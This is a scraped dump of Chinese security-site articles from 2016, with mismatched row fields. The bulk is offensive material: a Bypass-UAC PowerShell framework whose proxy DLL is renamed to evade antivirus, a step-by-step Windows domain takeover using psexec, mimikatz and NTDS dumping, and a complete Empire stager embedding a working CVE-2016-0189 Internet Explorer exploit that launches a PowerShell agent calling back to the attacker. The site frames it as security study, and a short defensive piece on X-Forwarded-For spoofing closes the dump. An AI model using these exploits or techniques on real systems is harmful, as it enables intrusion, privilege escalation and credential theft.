COM对象所提供的方法来实现自动提权。这其实并不是一种新的技术了，在此之前，我们可以通过向“explorer.exe”进程注入DLL来实现UAC绕过。但是这种方式并不是最有效的，因为向explorer注入DLL很有可能会触发系统的安全警报。不仅如此，利用这种固定的、无法控制的DLL来实现UAC绕过，将会极大地降低操作的灵活性。如果想解决这个问题，那么Bypass-UAC就是一个很好的选择了。Bypass-UAC可以重写PowerShell的PEB结构，这种方法所实现的效果与之前的方法效果相同，因为COM对象完全依赖于Windows的进程状态API（PSAPI），而该API可以读取进程的PEB信息。使用Bypass-UAC是一个独立的框架，它不需要依赖其他任何的环境。但是请注意，使用该框架时唯一的要求就是目标主机必须安装有PowerShell v2。方法：1.UacMethodSysprep：Leo Davidson设计出的一种技术(sysprep -&gt; cryptbase.dll)目标系统: x32/x64 Windows 7 &amp; 82.ucmDismMethod: 一种混合方法 (PkgMgr -&gt; DISM -&gt; dismcore.dll)目标系统: x64 Win7+ (该漏洞目前已修复)3.UacMethodMMC2: 一种混合方法(mmc -&gt; rsop.msc -&gt; wbemcomn.dll)目标系统: x64 Win7+ (该漏洞目前已修复)4.UacMethodTcmsetup: 一种混合方法(tcmsetup -&gt; tcmsetup.exe.local -&gt; comctl32.dll)目标系统: x32/x64 Win7+ (该漏洞目前已修复) 输出样例Windows 7专业版Windows 8 企业版组件PSReflect该组件由Matt Graeber（@mattifestation）负责开发，它可以帮助你在内存中轻松定义枚举类型、结构体、以及Win32函数。这个组件是非常关键的，正是因为它的存在，所以PowerShell可以无需在运行时编译C#代码，并直接调用Windows提供的API接口。需要注意的是，这种操作模式在大多数情况下都没问题，但是如果“csc”文件被屏蔽的话，此时就无法向本地磁盘中写入临时文件了。Masquerade-PEB（伪造的PEB）这是修改版的Masquerade-PEB，它可以使用PSReflect组件。这个函数可以重写PowerShell的PEB结构，从而实现伪装“explorer.exe”的目的。Invoke-IFileOperation该组件可以在内存中加载一个.NET dll，进而将IFileOperation COM对象的访问接口暴露给PowerShell。该组件所实现的功能参考了Stephen Toub在2007年12月份的MSDN杂志中所发表的内容，本项目Github仓库的image文件夹中提供有相关信息。除此之外，用户也可以访问FileOperation文件夹来获取有关该组件的详细信息。PS C:\Users\b33f&gt; $IFileOperation |Get-Member      TypeName: FileOperation.FileOperation   Name              MemberType Definition ----              ---------- ---------- CopyItem          Method     void CopyItem(string source, string destination, string newName) DeleteItem        Method     void DeleteItem(string source) Dispose           Method     void Dispose(), void IDisposable.Dispose() Equals            Method     bool Equals(System.Object obj) GetHashCode       Method     int GetHashCode() GetType           Method     type GetType() MoveItem          Method     void MoveItem(string source, string destination, string newName) NewItem           Method     void NewItem(string folderName, string name, System.IO.FileAttributes attrs) PerformOperations Method     void PerformOperations() RenameItem        Method     void RenameItem(string source, string newName) ToString          Method     string ToString()  Emit-Yamabiko该组件可以向磁盘中写入一个x32或x64位的代理DLL，这个DLL是基于UACME项目（@hfiref0x）中的fubuki来实现的。简而言之，我去掉了其中的一些冗余功能，并且对部分代码文件和变量进行了重命名以躲避反病毒产品的检测。如果用户感兴趣的话，可以访问Yamabiko文件夹获取关于该组件的详细信息。 贡献代码目前，Bypass-UAC框架中主要提供了四种绕过方法。之后我会逐步添加新的UAC绕过方法，但是如果有能力的用户可以给我提供帮助的话，那就再好不过了。实际上，添加新方法的步骤是十分简单的，下面给出了一段演示代码，仅供各位参考。当然了，各位也可以直接使用EXPORTSTOC++工具，这样会方便很多。'UacMethodSysprep'{    # Original Leo Davidson sysprep method    # Works on everything pre 8.1    if ($OSMajorMinor -ge 6.3) {        echo ""[!] Your OS does not support this method!`n""        Return    }      # Impersonate explorer.exe    echo ""`n[!] Impersonating explorer.exe!""    Masquerade-PEB -BinPath ""C:\Windows\explorer.exe""      if ($DllPath) {        echo ""[&gt;] Using custom proxy dll..""        echo ""[+] Dll path: $DllPath""    } else {        # Write Yamabiko.dll to disk        echo ""[&gt;] Dropping proxy dll..""        Emit-Yamabiko    }      # Expose IFileOperation COM object    Invoke-IFileOperation      # Exploit logic    echo ""[&gt;] Performing elevated IFileOperation::MoveItem operation..""    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\System32\sysprep\'), ""cryptbase.dll"")    $IFileOperation.PerformOperations()    echo ""`n[?] Executing sysprep..""    IEX $($env:SystemRoot + '\System32\sysprep\sysprep.exe')      # Clean-up    echo ""[!] UAC artifact: $($env:SystemRoot + '\System32\sysprep\cryptbase.dll')`n""}免责声明该项目仅允许授权用户使用，请不要将其用于恶意目的。如果用户使用该项目来进行非法操作的话，本人一概不负责。保护自己的安全不要向普通用户提供本地管理员权限；修改UAC的默认设置，将其修改为“始终通知并等待我的响应”。除此之外，在授权某项操作时，还应该要求用户输入密码。别忘了微软公司的官方声明：UAC并不是一个安全保护功能。 参考资料－UACME：https://github.com/hfiref0x/UACME－Windows 7 UAC 白名单：http://www.pretentiousname.com/misc/win7_uac_whitelist2.html－恶意应用兼容性分析：https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf－UACMe线程的内核模式分析：http://www.kernelmode.info/forum/viewtopic.php?f=11&amp;t=3643－Syscan360，UAC安全问题：https://www.syscan360.org/slides/2013_ZH_DeepThinkingTheUACSecurityIssues_Instruder.pdf－微软技术支持，Windows 7的用户账户控制机制：https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx－Cobalt Strike，用户账户控制－渗透测试人员必备知识：http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/","2016-09-18 23:35:57","Web安全","Bypass-UAC-帮你绕过Windows的用户账户控制","http://nsoad.com/Article/web/20160918/413.html"
"5ccbfa944f2f0a0a7a69c089","相隔好几个月，“北极熊”再次更新，像我那么勤快的人好像已经不多见了。。。。安全工具，更新频率都不是很高，说实在的一句话，好用就行，本次可以说是大改，以及大量调整，曾经有人反馈，速度不快，容易","silence","VaultPasswordView是Windows 10/8/7系统的密码破解工具，你可以用它来解密当前正在运行的系统的Windows Vault数据，以及存储在外部硬盘驱动器上的Windows Vault数据。系统要求该应用程序适用于任何版本的Windows，从Windows 7到Windows10的Windows 32位和64位系统。你也可以在Windows XP sp3使用该工具。Windows vault文件位置Windows vault文件储存在以下文件夹：1、C:\Users\[User Profile]\AppData\Local\Microsoft\Vault2、C:\ProgramData\Microsoft\Vault3、C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault初步使用VaultPasswordView不需要任何的安装过程或额外的DLL文件。下载完，我们解压后点击VaultPasswordView.exe运行。程序汉化因为程序本身的语言是英文，使用起来感觉还是很不习惯的，所以我们还可以来汉化一下程序，使用起来更方便。我们首先在程序目录下使用命令行运行以下命令VaultPasswordView.exe /savelangfile运行完，在程序目录下将生成一个文件VaultPasswordView_lng.ini然后我们可以打开这个文件进行翻译了，我这里简单的翻译了一下。保存退出，查看效果：","2016-09-29 11:26:28","安全工具","VaultPasswordView：可用于查看windows Vault密码的工具","http://nsoad.com/Security-tools/20160929/tools-464.html"
"5ccbfa944f2f0a0a7a69c08a","项目主页https://github.com/arthepsy/ssh-audit简介ssh-audit是一款用于审计ssh服务器的开源工具特性SSH1及SSH2协议服务器的支持;","Kong","项目主页https://github.com/arthepsy/ssh-audit简介ssh-audit是一款用于审计ssh服务器的开源工具特性SSH1及SSH2协议服务器的支持;抓取banner，识别设备或软件和操作系统，检测压缩；收集交换密钥，主机密钥，加密和消息认证码算法;输出算法信息 (available since, removed/disabled, unsafe/weak/legacy, etc等);输出算法建议（添加或删除基于公认的软件版本）;输出安全信息（有关的问题，分配CVE列表等）;分析基于算法的信息SSH版本的兼容性;从OpenSSH的，Dropbear SSH和libssh历史信息;没有依赖关系，与Python 2.6+，Python的3.x和PyPy兼容;使用示例","2016-10-16 16:47:41","安全工具","ssh-audit：开源SSH服务器审计工具","http://nsoad.com/Security-tools/20161016/tools-575.html"
"5ccbfa944f2f0a0a7a69c08b","信息收集 	acccheck	ace-voip	Amap	Automater	bing-ip2hosts	braa	CaseFile	CDPSnarf	cisco-torch	Cookie Cadger	copy-router-config	DMitry	dnmap	dnsenum	dnsmap	DNSReco","Kong","工具收集翻译作者：4ido10n 信息收集 	acccheck	ace-voip	Amap	Automater	bing-ip2hosts	braa	CaseFile	CDPSnarf	cisco-torch	Cookie Cadger	copy-router-config	DMitry	dnmap	dnsenum	dnsmap	DNSRecon	dnstracer	dnswalk	DotDotPwn	enum4linux	enumIAX	exploitdb	Fierce	Firewalk	fragroute	fragrouter	Ghost Phisher	GoLismero	goofile	hping3	InTrace	iSMTP	lbd	Maltego Teeth	masscan	Metagoofil	Miranda	Nmap	ntop	p0f	Parsero	Recon-ng	SET	smtp-user-enum	snmpcheck	sslcaudit	SSLsplit	sslstrip	SSLyze	THC-IPV6	theHarvester	TLSSLed	twofi	URLCrazy	Wireshark	WOL-E	Xplico Web应用程序 	apache-users	Arachni	BBQSQL	BlindElephant	Burp Suite	CutyCapt	DAVTest	deblaze	DIRB	DirBuster	fimap	FunkLoad	Grabber	jboss-autopwn	joomscan	jSQL	Maltego Teeth	PadBuster	Paros	Parsero	plecost	Powerfuzzer	ProxyStrike	Recon-ng	Skipfish	sqlmap	Sqlninja	sqlsus	ua-tester	Uniscan	Vega	w3af	WebScarab	Webshag	WebSlayer	WebSploit	Wfuzz	WPScan	XSSer	zaproxy压力测试 	DHCPig	FunkLoad	iaxflood	Inundator	inviteflood	ipv6-toolkit	mdk3	Reaver	rtpflood	SlowHTTPTest	t50	Termineter	THC-IPV6	THC-SSL-DOS脆弱性分析 	BBQSQL	BED	cisco-auditing-tool	cisco-global-exploiter	cisco-ocs	cisco-torch	copy-router-config	DBPwAudit	Doona	DotDotPwn	Greenbone Security Assistant	GSD	HexorBase	Inguma	jSQL	Lynis	Nmap	ohrwurm	openvas-administrator	openvas-cli	openvas-manager	openvas-scanner	Oscanner	Powerfuzzer	sfuzz	SidGuesser	SIPArmyKnife	sqlmap	Sqlninja	sqlsus	THC-IPV6	tnscmd10g	unix-privesc-check	Yersinia利用工具 	Armitage	Backdoor Factory	BeEF	cisco-auditing-tool	cisco-global-exploiter	cisco-ocs	cisco-torch	crackle	jboss-autopwn	Linux Exploit Suggester	Maltego Teeth	SET	ShellNoob	sqlmap	THC-IPV6	Yersinia 嗅探 &amp; 欺骗 	Burp Suite	DNSChef	fiked	hamster-sidejack	HexInject	iaxflood	inviteflood	iSMTP	isr-evilgrade	mitmproxy	ohrwurm	protos-sip	rebind	responder	rtpbreak	rtpinsertsound	rtpmixsound	sctpscan	SIPArmyKnife	SIPp	SIPVicious	SniffJoke	SSLsplit	sslstrip	THC-IPV6	VoIPHopper	WebScarab	Wifi Honey	Wireshark	xspy	Yersinia	zaproxy 维持访问 	CryptCat	Cymothoa	dbd	dns2tcp	http-tunnel	HTTPTunnel	Intersect	Nishang	polenum	PowerSploit	pwnat	RidEnum	sbd	U3-Pwn	Webshells	Weevely	Winexe硬件攻击 	android-sdk	apktool	Arduino	dex2jar	Sakis3G	smali无线攻击 	Aircrack-ng	Asleap	Bluelog	BlueMaho	Bluepot	BlueRanger	Bluesnarfer	Bully	coWPAtty	crackle	eapmd5pass	Fern Wifi Cracker	Ghost Phisher	GISKismet	Gqrx	gr-scan	kalibrate-rtl	KillerBee	Kismet	mdk3	mfcuk	mfoc	mfterm	Multimon-NG	PixieWPS	Reaver	redfang	RTLSDR Scanner	Spooftooph	Wifi Honey	Wifitap	Wifite取证工具 	Binwalk	bulk-extractor	Capstone	chntpw	Cuckoo	dc3dd	ddrescue	DFF	diStorm3	Dumpzilla	extundelete	Foremost	Galleta	Guymager	iPhone Backup Analyzer	p0f	pdf-parser	pdfid	pdgmail	peepdf	RegRipper	Volatility	Xplico 密码攻击 	acccheck	Burp Suite	CeWL	chntpw	cisco-auditing-tool	CmosPwd	creddump	crunch	DBPwAudit	findmyhash	gpp-decrypt	hash-identifier	HexorBase	THC-Hydra	John the Ripper	Johnny	keimpx	Maltego Teeth	Maskprocessor	multiforcer	Ncrack	oclgausscrack	PACK	patator	phrasendrescher	polenum	RainbowCrack	rcracki-mt	RSMangler	SQLdict	Statsprocessor	THC-pptp-bruter	TrueCrack	WebScarab	wordlists	zaproxy逆向工程 	apktool	dex2jar	diStorm3	edb-debugger	jad	javasnoop	JD-GUI	OllyDbg	smali	Valgrind	YARA报告工具 	CaseFile	CutyCapt	dos2unix	Dradis	KeepNote	MagicTree	Metagoofil	Nipper-ng	pipal","2016-10-21 00:44:15","安全工具","Kali Linux 工具使用中文说明书","http://nsoad.com/Security-tools/20161021/tools-617.html"
"5ccbfa944f2f0a0a7a69c08c","有个高中微信搞笑群，常发一些搞笑的图片，但是发后就撤回了，一不小心就看不到了，所以就想着怎么查看撤回的图片或者文字。","dalamar","环境拓扑我们的目的是获取redhook.DA域的一个可用的账户，当前攻击者已在公司网络内，但并未在同一个子网。Compromising Client 1假设我们已经获取到了Client1的登陆凭据，如果网络足够大，你可以发现存储在某处网络共享上面的其他凭据（通过批量的脚本：vbs,ps1,.net等等）。关于怎么访问网络，你可以使用Cobalt Strike框架。我们可以这样做：我们可以通过批量的脚本快速的获得NETBIOS的信息。在win上，可以用命令nbtstat -A IP获得相同的信息，可以看到机器名是WIN7-ENT-CLI1，属于REDHOOK域。PsExec:使用msf的psexec可以很容易的获取到一个shell。BOB是一个本地用户，不用指定SMBDomain参数。我们也可以使用Impacket’s PsExec，但psexec的好处是可以传递hash。不要忘了微软自己的PSEXEC有额外的好处，添加一个-s参数会给你一个system的shell。WMI一些WMI的选项也可以让你远程系统上执行命令。最值得注意的是WMIC，不仅可以在远程系统上执行命令，还可以通过内置的命令获取系统的敏感信息和配置操作系统。最好使用cmd.exe /c或powershell -exec bypass -command。我们使用Impacket WmiExec可以获取到一个半交互式的shell，执行命令并获取输出。最后使用PowerSploit的Invoke-WmiCommand命令。Pass-The-Hash, WCE &amp; Mimikatz:有时候你只能获取到NTLM的hash值，可以使用msf的psexec或WCE或Mimikatz。缺点是WCE可能会被发现，而mimikatz是直接加载内存。Smash-And-GrabMetasploit (Mimikatz &amp; hashdump):Secretsdump &amp; Invoke-Mimikatz:也可以使用Impacket’s SecretsDump和Powersploit’s Invoke-Mimikatz来获取。mimikatz的脚本托管在攻击者的服务器上。可能还有其他技术，但是以上是最经典的。Impersonation:现在我们有了redhook域里的一台机器并且能连接到不同的子网中，现在开始做一个信息收集。要查询域的信息，需要有一个域用户，当前的bob用户并不是域用户或system权限，但是我们可以通过NtQuerySystemInformation来发现其他用户的token，进而模拟他们登陆。meterpreter有这个插件，使这个过程非常简单。也可以使用incognito（下载地址：https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/）Reconnaissance域侦察：现在我们有了一个域用户，我们需要尽快扩大战果。以上命令分别是：获取当前用户获取当前机器名获取IP信息获取域内共享资源列表返回验证当前登录会话的域控制器的名称获取域控地址查看本机所有用户查看域用户查看所有本地管理员组的用户列出域内活跃的机器和会话获取从域控上的连接源获取本地管理员的信息获取域管理员的信息通过简单的信息收集，我们能了解到让我们自己成为域管理员的途径。TemplateAdmin 是client1和client2的管理员虽然我们没有明文，但是我们有TemplateAdmi的hash来访问client2REDHOOK\ Administrator认证在client2，如果搞定client2，即可获得域控Socks Proxy:最后一个事就是添加路由，让我们通过代理能访问系统，如果使用msf或cobalt strike那么就非常简单。使用session1 通过socks4a来进行进一步的扫描。使用proxychains。Compromising Client 2Metasploit (PortProxy &amp; PsExec):共享的本地管理员账户，客户端1和客户端2的TemplateAdmin是通用的账号，密码也一样。 我们可以使用portproxy从client1进行端口转发。client1监听10.1.1.2:9988向10.0.0.128:9988发送流量。再配置psexec。Impacket (PsExec) &amp; netsh:在client1上使用netsh手动设置转发规则。现在有个规则是把流量从10.0.0.129:5678转发到10.1.1.3:445，Impacket’s PsExec需要一个自定义端口，编辑源码来实现。当完成转发之后，记得清理规则。C:\Windows\system32&gt; netsh interface portproxy reset  如果我们获取不到明文密码，我们仍然可以冒充域管理员的令牌。Smash-And-Grab ²Metasploit Easy-Mode (Mimikatz &amp; hashdump &amp; incognito):Impacket (PsExec) &amp; incognito:我们使用incognito来执行远程命令。文件传输接下来我们就很容易来拖拽文件了。Compromising Redrum-DCSocks Proxy &amp; Impacket (WmiExec):我们要么获取域管理员的密码，要么我们自己新建一个域管理员。还记得之前用户socks代理么，我们可以使用它来访问域内几乎所有东西。Sysinternals (PsExec) &amp; Invoke-Mimikatz:win2k12增强了hash的保护性，所以我们这样来获取hash值。提取NTDS很多时候提取了NTDS 说明渗透要结束了，下面我介绍一下访问本地shell或通过wmi来执行命令的方法。Volume Shadow Copy (Classic-Mode):把文件拖到攻击者的机器里面有很多方法，我介绍一种，可以简单的使用Impacket’s SecretsDump本地解压传输内容。注意下NTDS可能会包含很多用户，甚至上千，是非常大的，导出的时候要小心。Socks Proxy &amp; Impacket (SecretsDump) (Easy-Mode):如果我们有socks代理，则很容易的使用明文密码来执行SecretsDump 。资源Active Directory Security (@PyroTek3) – hereharmj0y (@harmj0y) – hereExploit-Monday (@mattifestation) – herePowerView – herePowerSploit – hereImpacket – hereImpacket compiled by maaaaz – hereMimikatz – hereIncognito – hereWindows Credentials Editor – hereSysinternals Suite – here*原文：fuzzysecurity Mottoin翻译发布","2016-09-22 15:21:16","Web安全","Windows域横向渗透","http://nsoad.com/Article/web/20160922/424.html"
"5ccbfa944f2f0a0a7a69c08d","这不是一篇渗透测试指导，而是简单介绍了几个Windows内网提权的实用命令，以供我等菜鸟学习观摩，还望大牛包涵指导。","dalamar","前言Empire（http://www.powershellempire.com/）是一个PowerShell后期漏洞利用代理工具，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能，它可以快速部署后期漏洞利用模块，并且能够躲避网络检测。因此，Powershell Empire是我们最喜欢的一款工具,尤其是当目标用户在我们的活动范围内时。我们通常使用Metasploit和Empire的组合来完成工作,即结合浏览器漏洞利用和Empire内的标准操作进行。不过，在最近的一个测试中，我们没有使用MSF，而是使用了Empire中的一个新stager，该stager能够利用漏洞CVE-2016-0189(也称为vbscript_godmod，是一个 IE 游览器的脚本引擎漏洞)来攻击目标用户的IE浏览器（Internet explorer 9-11）。这是近6个月以来我们的首选利用,而且最近我们已经开始开发利用工具。如果成功的话,可以在保证硬盘数据不丢失的情况下启动powershell，同时将代理连接到Empire。 利用Powershell Empire和CVE-2016-0189攻击用户的IE浏览器下面是该新stager的Python代码ms16.py：from lib.common import helpers  class Stager:      def __init__(self, mainMenu, params=[]):          self.info = {            'Name': 'MS16-051 IE RCE',              'Author': ['www.cgsec.co.uk'],              'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'),              'Comments': [                'Target will have to open link with vulnerable version of IE.'            ]        }          # any options needed by the stager, settable during runtime        self.options = {            # format:            #   value_name : {description, required, default_value}            'Listener' : {                'Description'   :   'Listener to generate stager for.',                'Required'      :   True,                'Value'         :   ''            },            'StagerRetries' : {                'Description'   :   'Times for the stager to retry connecting.',                'Required'      :   False,                'Value'         :   '0'            },            'OutFile' : {                'Description'   :   'File to output HTML to, otherwise displayed on the screen.',                'Required'      :   True,                'Value'         :   ''            },            'Base64' : {                'Description'   :   'Switch. Base64 encode the powershell output.',                'Required'      :   True,                'Value'         :   'True'            },                       'UserAgent' : {                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',                'Required'      :   False,                'Value'         :   'default'            },            'Proxy' : {                'Description'   :   'Proxy to use for request (default, none, or other).',                'Required'      :   False,                'Value'         :   'default'            },            'ProxyCreds' : {                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',                'Required'      :   False,                'Value'         :   'default'            }        }          # save off a copy of the mainMenu object to access external functionality        #   like listeners/agent handlers/etc.        self.mainMenu = mainMenu          for param in params:            # parameter format is [Name, Value]            option, value = param            if option in self.options:                self.options[option]['Value'] = value      def generate(self):          # extract all of our options        listenerName = self.options['Listener']['Value']        base64 = self.options['Base64']['Value']        userAgent = self.options['UserAgent']['Value']        proxy = self.options['Proxy']['Value']        proxyCreds = self.options['ProxyCreds']['Value']        stagerRetries = self.options['StagerRetries']['Value']          encode = False        if base64.lower() == ""true"":            encode = True          # generate the launcher code        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)          if launcher == """":            print helpers.color(""[!] Error in launcher command generation."")            return """"        else:                            code =  ""&lt;html&gt;\n""                            code += ""&lt;head&gt;\n""                            code += ""&lt;meta http-equiv=\""x-ua-compatible\"" content=\""IE=10\""&gt;\n""                            code += ""&lt;/head&gt;\n""                            code += ""&lt;body&gt;\n""                            code += ""    &lt;script type=\""text/vbscript\""&gt;\n""                            code += ""        Dim aw\n""                            code += ""        Dim plunge(32)\n""                            code += ""        Dim y(32)\n""                            code += ""        prefix = \""%u4141%u4141\""\n""                            code += ""        d = prefix &amp; \""%u0016%u4141%u4141%u4141%u4242%u4242\""\n""                            code += ""        b = String(64000, \""D\"")\n""                            code += ""        c = d &amp; b\n""                            code += ""        x = UnEscape(c)\n""                            code += ""          \n""                            code += ""        Class ArrayWrapper\n""                            code += ""            Dim A()\n""                            code += ""            Private Sub Class_Initialize\n""                            code += ""                  ReDim Preserve A(1, 2000)\n""                            code += ""            End Sub\n""                            code += ""                    \n""                            code += ""            Public Sub Resize()\n""                            code += ""                ReDim Preserve A(1, 1)\n""                            code += ""            End Sub\n""                            code += ""        End Class\n""                            code += ""          \n""                            code += ""        Class Dummy\n""                            code += ""        End Class\n""                            code += ""          \n""                            code += ""        Function getAddr (arg1, s)\n""                            code += ""            aw = Null\n""                            code += ""            Set aw = New ArrayWrapper\n""                            code += ""          \n""                            code += ""            For i = 0 To 32\n""                            code += ""                Set plunge(i) = s\n""                            code += ""            Next\n""                            code += ""          \n""                            code += ""            Set aw.A(arg1, 2) = s\n""                            code += ""          \n""                            code += ""            Dim addr\n""                            code += ""            Dim i\n""                            code += ""            For i = 0 To 31\n""                            code += ""                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n""                            code += ""                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n""                            code += ""                End If\n""                            code += ""                y(i) = Null\n""                            code += ""            Next\n""                            code += ""          \n""                            code += ""            If addr = Null Then\n""                            code += ""                document.location.href = document.location.href\n""                            code += ""                Return\n""                            code += ""            End If\n""                            code += ""            getAddr = addr\n""                            code += ""        End Function\n""                            code += ""          \n""                            code += ""        Function leakMem (arg1, addr)\n""                            code += ""            d = prefix &amp; \""%u0008%u4141%u4141%u4141\""\n""                            code += ""            c = d &amp; intToStr(addr) &amp; b\n""                            code += ""            x = UnEscape(c)\n""                            code += ""          \n""                            code += ""            aw = Null\n""                            code += ""            Set aw = New ArrayWrapper\n""                            code += ""          \n""                            code += ""            Dim o\n""                            code += ""            o = aw.A(arg1, 2)\n""                            code += ""          \n""                            code += ""            leakMem = o\n""                            code += ""        End Function\n""                            code += ""          \n""                            code += ""        Sub overwrite (arg1, addr)\n""                            code += ""            d = prefix &amp; \""%u400C%u0000%u0000%u0000\""\n""                            code += ""            c = d &amp; intToStr(addr) &amp; b\n""                            code += ""            x = UnEscape(c)\n""                            code += ""          \n""                            code += ""            aw = Null\n""                            code += ""            Set aw = New ArrayWrapper\n""                            code += ""          \n""                            code += ""          \n""                            code += ""            aw.A(arg1, 2) = CSng(0)\n""                            code += ""        End Sub\n""                            code += ""          \n""                            code += ""        Function exploit (arg1)\n""                            code += ""            Dim addr\n""                            code += ""            Dim csession\n""                            code += ""            Dim olescript\n""                            code += ""            Dim mem\n""                            code += ""          \n""                            code += ""          \n""                            code += ""            Set dm = New Dummy\n""                            code += ""          \n""                            code += ""            addr = getAddr(arg1, dm)\n""                            code += ""          \n""                            code += ""            mem = leakMem(arg1, addr + 8)\n""                            code += ""            csession = strToInt(Mid(mem, 3, 2))\n""                            code += ""          \n""                            code += ""            mem = leakMem(arg1, csession + 4)\n""                            code += ""            olescript = strToInt(Mid(mem, 1, 2))\n""                            code += ""            overwrite arg1, olescript + &amp;H174\n""                            code += ""     Set Object = CreateObject(\""Wscript.Shell\"")\n""                            code +=    ""                 Object.run(\""""                            code +=            launcher +       ""\"")\n""                            code += ""        End Function\n""                            code += ""          \n""                            code += ""        Function triggerBug\n""                            code += ""            aw.Resize()\n""                            code += ""            Dim i\n""                            code += ""            For i = 0 To 32\n""                            code += ""                ' 24000x2 + 6 = 48006 bytes\n""                            code += ""                y(i) = Mid(x, 1, 24000)\n""                            code += ""            Next\n""                            code += ""        End Function\n""                            code += ""    &lt;/script&gt;\n""                            code += ""          \n""                            code += ""    &lt;script type=\""text/javascript\""&gt;\n""                            code += ""        function strToInt(s)\n""                            code += ""        {\n""                            code += ""            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n""                            code += ""        }\n""                            code += ""        function intToStr(x)\n""                            code += ""        {\n""                            code += ""            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n""                            code += ""        }\n""                            code += ""        var o;\n""                            code += ""        o = {\""valueOf\"": function () {\n""                            code += ""                triggerBug();\n""                            code += ""                return 1;\n""                            code += ""            }};\n""                            code += ""        setTimeout(function() {exploit(o);}, 50);\n""                            code += ""    &lt;/script&gt;\n""                            code += ""&lt;/body&gt;\n""                            code += ""&lt;/html&gt;""           return code接下来，我们就对这个新的利用做一个简单的介绍：首先，我们需要获得Empire,可以从Github上下载，下载地址为：https://github.com/PowerShellEmpire/Empire 接下来，我们需要安装Apache2，它可以把索引页直接导向/var/www/html。这一步是可选的，因为大多数人可能想要改变输出,用于其他利用或者逃避检测。然后，添加我们的新stager，它位于/lib/stagers下，运行Empire的install.sh脚本来启动并运行它。如果你是在Ubuntu上进行操作,那么在运行该脚本之前你需要手动安装pip。在做好前面的准备工作之后，我们就可以启动Empire了。如果一切正常的话，我们应该能够使用“stager ms16”。本文只是简单地将输出文件设置到/var/www/html/index.html，然后引导目标到该html页面，如下图所示。高级一些的用户可能想为不同的用户建立一些更复杂的服务或躲避检测机制,不过这超出了本文的范围，本文只是做出一个简单的介绍。此外，我还设置了一个对端口443的侦听器,希望绕过某些防火墙和逃避一些检测机制。最后，当有人使用一个含有漏洞CVE-2016-0189的IE浏览器访问你的服务器时，该利用就会触发，你就会得到一个新的Empire代理。另外，使用持久性模块创建一个计划任务可以确保不会在重启之后失去访问权限。这些可以通过将代理设置为自动运行来实现。最后声明，本文只是提供了一个利用的简单介绍，仅供安全学习，禁止非法使用！也提醒用户抓紧时间对IE浏览器进行漏洞修复，微软已经发布了CVE-2016-0189漏洞的修复补丁。","2016-09-18 23:42:02","Web安全","利用Powershell Empire和CVE-2016-0189攻击用户的IE浏览器","http://nsoad.com/Article/web/20160918/414.html"
"5ccbfa944f2f0a0a7a69c08e","如何获取用户的IP，这个需求简直是太常见了，像登录入口，注册入口，投票，日志记录，api接口中判断同一个ip单位时间内的请求数，可是怎么去获取用户的真实IP呢？网上的代码","Kong","如何获取用户的IP，这个需求简直是太常见了，像登录入口，注册入口，投票，日志记录，api接口中判断同一个ip单位时间内的请求数，可是怎么去获取用户的真实IP呢？网上的代码很多，好多人直接拿来就用，却没有想到带来了很大的安全问题。1 代码示例<!--?phpif(!empty($_SERVER['HTTP_CLIENT_IP'])){   $myip = $_SERVER['HTTP_CLIENT_IP'];}else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   $myip = $_SERVER['HTTP_X_FORWARDED_FOR'];}else{   $myip= $_SERVER['REMOTE_ADDR'];}echo $myip;?-->这是网上的一个示范例子，我们很多同事也这么写，上面这个例子是php实现的，由于HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,HTTP_X_FORWARDED,HTTP_X_CLUSTER_CLIENT_IP,HTTP_FORWARDED_FOR,HTTP_FORWARDED，HTTP_VIA (经过的 Proxy)这些以HTTP打头的server变量都是用户可控的，由此可导致xss，认证绕过等缺陷。下面我们看下python的例子：def get_ip(request):    try:        return request.META['HTTP_X_FORWARDED_FOR']    except KeyError:        try:            return request.META['HTTP_X_REAL_IP']        except KeyError:            return request.META.get('REMOTE_ADDR', None) 也是由于客户端变量可控导致获取的ip可为任意值。在此例中,X-Real-IP是nginx特有的，通过配置proxy_set_header X-Real-IP $remote_addr;从REMOTE_ADDR中取值。2 X-Forwarded-For和 REMOTE_ADDR的区别REMOTE_ADDR代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个X-Forwarded-For头，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。假设用户的请求顺序如下：网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器REMOTE_ADDR:代理服务器2的IP值X-Forwarded-For就是：网民电脑IP，代理1的IP，代理2的IP在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。下面简单示例下一个篡改X-Forwarded-For的情况：GET / HTTP/1.1Host: www.myip.cnCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, 